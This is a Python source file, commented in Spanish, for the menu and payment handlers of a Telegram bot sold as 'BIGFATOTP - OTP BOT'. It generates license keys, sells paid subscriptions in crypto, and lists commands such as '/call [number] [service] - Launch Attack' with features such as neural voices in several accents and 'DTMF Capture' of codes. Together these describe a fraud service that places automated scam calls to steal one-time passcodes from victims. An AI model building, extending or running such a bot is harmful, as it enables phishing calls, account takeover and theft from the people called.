import secrets
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import bot, ADMIN_IDS
from database import get_connection, check_subscription
from handlers.keys import process_key_step
from handlers.payments import create_hoodpay_payment
# Importamos para redirigir
from handlers.profile import show_profile, show_referral

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    # ==========================================
    # 🔙 LÓGICA DE VOLVER AL INICIO (HOME)
    # ==========================================
    if call.data == "back_home":
        # Reconstruimos el Menú Principal
        text = f"BIGFATOTP - 𝙊𝙏𝙋 𝘽𝙊𝙏\nHello, {call.from_user.first_name}!\n\nSelect an option below:"
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🎟️ Enter Key", callback_data="enter_key"),
            InlineKeyboardButton("👤 Profile", callback_data="show_profile"),
            InlineKeyboardButton("🪙 ₿uy Plan", callback_data="buy_subs"),
            InlineKeyboardButton("🤖 Commands", callback_data="commands"),
            InlineKeyboardButton("🛠️ Features", callback_data="features"),
            InlineKeyboardButton("🫂 Community", callback_data="community"),
            InlineKeyboardButton("👥 Referral", callback_data="referral"),
            InlineKeyboardButton("⛑️ Support", callback_data="support")
        )
        # Botón de Admin solo si es admin
        if user_id in ADMIN_IDS:
            markup.add(InlineKeyboardButton("🕴️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟", callback_data="admin_panel"))
            
        # Editamos el mensaje actual para volver al menú
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)

    # ==========================================
    # 👤 PERFIL Y REFERIDOS
    # ==========================================
    elif call.data == "show_profile":
        # Borramos el mensaje anterior y lanzamos el perfil (que ya tiene botón Back)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_profile(call.message)

    elif call.data == "referral":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_referral(call.message)

    elif call.data == "bot_status":
        bot.answer_callback_query(call.id, "✅ Systems Online", show_alert=True)

    # ==========================================
    # 🕴️ ADMIN PANEL
    # ==========================================
    elif call.data == "admin_panel":
        if user_id in ADMIN_IDS:
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🔑 1 Day", callback_data="gen_1"), InlineKeyboardButton("🔑 1 Week", callback_data="gen_7"))
            markup.row(InlineKeyboardButton("📜 Logs", callback_data="show_log"), InlineKeyboardButton("ℹ️ Version", callback_data="show_version"))
            # 🔙 BOTÓN BACK
            markup.add(InlineKeyboardButton("⬅ Back to Menu", callback_data="back_home"))
            
            bot.edit_message_text("🕴️ **ADMIN DASHBOARD**\nSelect an action:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "⛔ Access Denied")

    # GENERACIÓN DE KEYS (ADMIN)
    elif call.data.startswith("gen_"):
        if user_id not in ADMIN_IDS: return
        days = int(call.data.split("_")[1])
        new_key = f"KEY-{secrets.token_hex(4).upper()}"
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO otp_licenses (key_code, duration_days) VALUES (%s, %s)", (new_key, days))
        conn.commit()
        conn.close()
        
        # Al generar key, mostramos mensaje y botón para volver
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back to Admin", callback_data="admin_panel"))
        
        bot.edit_message_text(
            f"✅ **Key Generated Successfully!**\n\n🔑 Code: `{new_key}`\n⏳ Duration: {days} Days", 
            call.message.chat.id, 
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )

    # ==========================================
    # ℹ️ MENÚS DE INFORMACIÓN
    # ==========================================
    elif call.data == "commands":
        text = """
🤖 **COMMANDS LIST**

👤 **User:**
`/start` - Main Menu
`/profile` - Subscription Info
`/call [number] [service]` - Launch Attack
`/setscript` - Create Custom Script
`/myscripts` - Manage Scripts
`/clean` - Delete History

👮‍♂️ **Admin:**
`/create [days]` - Generate Key Manual
`/admin` - Quick Check
        """
        markup = InlineKeyboardMarkup()
        # 🔙 BOTÓN BACK
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    
    elif call.data == "features":
        text = "🛠️ **FEATURES**\n\n• **Neural Voice:** Native accents (US, MX, ES, BR).\n• **DTMF Capture:** Instant code logging.\n• **Scripts:** Custom scenarios database.\n• **Payments:** Crypto automated."
        markup = InlineKeyboardMarkup()
        # 🔙 BOTÓN BACK
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "community":
        text = "🫂 **COMMUNITY**\n\nJoin our official channel for updates, scripts, and support:\n\n👉 @YourChannelHere"
        markup = InlineKeyboardMarkup()
        # 🔙 BOTÓN BACK
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data == "support":
        text = "⛑️ **SUPPORT**\n\nNeed help with a payment or setup?\n\nContact: @MatthewOwner\n_Response time: 2-4 hours_"
        markup = InlineKeyboardMarkup()
        # 🔙 BOTÓN BACK
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    # ==========================================
    # 💳 PAGOS Y KEYS
    # ==========================================
    elif call.data == "enter_key":
        # Aquí no podemos poner botón "Atrás" fácil porque es un input de texto,
        # pero podemos poner un botón de cancelar.
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Cancel / Back", callback_data="back_home"))
        
        msg = bot.send_message(call.message.chat.id, "🎟️ **REDEEM LICENSE**\n\nPlease paste your Key below (e.g., `KEY-XXXX`):", reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_key_step)

    elif call.data == "buy_subs":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📅 1 Day ($50)", callback_data="pay_daily"))
        markup.add(InlineKeyboardButton("🗓 1 Week ($150)", callback_data="pay_weekly"))
        markup.add(InlineKeyboardButton("📆 1 Month ($285)", callback_data="pay_monthly"))
        # 🔙 BOTÓN BACK
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        
        bot.edit_message_text("💳 **SELECT SUBSCRIPTION PLAN**\n\nChoose your license duration. Activation is automatic.", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data in ["pay_daily", "pay_weekly", "pay_monthly", "pay_dev_test"]:
        plan = call.data.split("_")[1]
        if "dev" in call.data: plan = "dev_test"
        create_hoodpay_payment(call.message.chat.id, plan)
        
    else:
        bot.answer_callback_query(call.id, "Coming soon")
